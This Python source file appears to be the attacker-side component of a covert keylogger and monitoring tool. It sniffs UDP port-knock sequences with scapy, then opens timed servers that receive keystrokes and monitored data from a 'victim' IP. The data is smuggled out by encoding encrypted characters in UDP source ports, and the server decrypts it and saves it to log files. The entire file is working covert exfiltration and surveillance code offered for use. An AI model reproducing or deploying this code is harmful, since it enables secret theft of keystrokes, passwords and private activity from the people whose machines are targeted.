import config
from encryption import decrypt
from multiprocessing import Process
from scapy.all import *
from scapy.layers.inet import UDP
import socket

keylog_index = 0
monitor_index = 0


def verify_keylog_knock():
    try:
        sniff(filter="udp and portrange 6767-6768", prn=keylog_knock_handler)  
    except KeyboardInterrupt:
        print("Exiting keylog knock sniffing...")


def verify_monitor_knock():
    try:
        sniff(filter="udp and portrange 8888-8889", prn=monitor_knock_handler)  
    except KeyboardInterrupt:
        print("Exiting monitor knock sniffing...")


def keylog_knock_handler(packet):
    global keylog_index

    if UDP in packet:
        if packet[UDP].dport == config.keylog_knock_sequence[keylog_index]:
            keylog_index += 1

            if keylog_index == len(config.keylog_knock_sequence):
                print(f"Port knocking successful, opening keylog server for {config.keylog_alive} seconds\n")
                allow_keylog_access()


def monitor_knock_handler(packet):
    global monitor_index

    if UDP in packet:
        if packet[UDP].dport == config.monitor_knock_sequence[monitor_index]:
            monitor_index += 1

            if monitor_index == len(config.monitor_knock_sequence):
                print(f"Port knocking successful, opening monitor server for {config.monitor_alive} seconds\n")
                allow_monitor_access()


def allow_keylog_access():
    global keylog_index
    keylog_index = 0
    
    keylog_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    keylog_socket.bind((config.attacker_ip, config.attacker_keylogger_port))
    
    print(f"Keylog server open, result will be saved in {config.keylog_file}")

    start_time = time.time()

    while True:
        # Breaks out of the loop after set amount of time
        elapsed_time = time.time() - start_time
        if elapsed_time >= config.keylog_alive:
            print(f"{config.keylog_alive} seconds passed, closing connection...\n")
            break

        data, addr = keylog_socket.recvfrom(1024)

        if addr[0] == config.victim_ip:
            source_port = addr[1] # victim's port holds encrypted data for covert transmission
            encrypted_byte = source_port.to_bytes(1, byteorder='big')
            decrypted_char = decrypt(encrypted_byte)

            f = open(config.keylog_file, "a")
            f.write(decrypted_char)
            f.close()

        # Breaks out of the loop after reaching end of file
        if data == b'EOF':
            # Inserting linebreak after completion
            f = open(config.keylog_file, "a")
            f.write("\n=====================\n\n")
            f.close()
            print("Transfer completed, closing connection...")

            break
    
    keylog_socket.close()


def allow_monitor_access():
    global monitor_index
    monitor_index = 0

    monitor_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    monitor_socket.bind((config.attacker_ip, config.attacker_monitor_port))

    # monitor_socket.listen(1)
    print(f"Monitor server open, result will be saved in {config.monitor_file}")

    start_time = time.time()

    while True:
        # Breaks out of the loop after set amount of time
        elapsed_time = time.time() - start_time
        if elapsed_time >= config.monitor_alive:
            print(f"{config.monitor_alive} seconds passed, closing connection...\n")
            break

        data, addr = monitor_socket.recvfrom(1024)

        if addr[0] == config.victim_ip:
            source_port = addr[1] # victim's port holds encrypted data for covert transmission
            encrypted_byte = source_port.to_bytes(1, byteorder='big')
            decrypted_char = decrypt(encrypted_byte)

            f = open(config.monitor_file, "a")
            f.write(decrypted_char)
            f.close()

        # Breaks out of the loop if end of file reached
        if data == b'EOF':
            # Inserting linebreak after completion
            f = open(config.monitor_file, "a")
            f.write("\n=====================\n\n")
            f.close()
            print("Transfer completed, closing connection...")
            break

    monitor_socket.close()


def main():
    if os.geteuid() != 0:
        sys.exit("Root privilege is required.")
    
    print("Watching for port knocks until Ctrl + C is pressed...\n")

    keylog_knock_process = Process(target=verify_keylog_knock)
    monitor_knock_process = Process(target=verify_monitor_knock)

    keylog_knock_process.start()
    monitor_knock_process.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        # Terminate the processes on keyboard interrupt
        keylog_knock_process.terminate()
        monitor_knock_process.terminate()

        # Wait for the processes to finish
        keylog_knock_process.join()
        monitor_knock_process.join()
        sys.exit("\n\nExiting port knock verification...")


if __name__ == "__main__":
    main()
